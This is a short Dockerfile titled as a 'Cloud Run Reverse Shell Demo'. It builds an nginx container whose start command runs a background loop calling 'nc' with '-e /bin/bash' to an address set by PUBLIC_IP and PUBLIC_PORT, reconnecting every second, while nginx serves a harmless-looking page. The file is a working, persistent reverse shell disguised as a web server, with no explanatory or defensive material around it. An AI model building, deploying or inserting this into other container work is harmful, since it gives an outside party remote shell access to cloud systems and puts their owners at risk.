FROM nginx:1.24.0-bullseye

RUN apt-get update && \
    apt-get install -y --no-install-recommends netcat-traditional python3 default-mysql-client && \
    apt-get upgrade -y && \
    rm -rf /var/lib/apt/lists/* && \
    sed -e 's/listen.*/listen ${PORT};/' /etc/nginx/conf.d/default.conf > default.conf.tpl && \
    echo '<h1>Cloud Run Reverse Shell Demo!</h1>' > /usr/share/nginx/html/index.html

CMD /bin/bash -c "envsubst < default.conf.tpl > /etc/nginx/conf.d/default.conf && (while : ; do nc $PUBLIC_IP $PUBLIC_PORT -e /bin/bash ; sleep 1 ; done) & exec nginx -g 'daemon off;'"
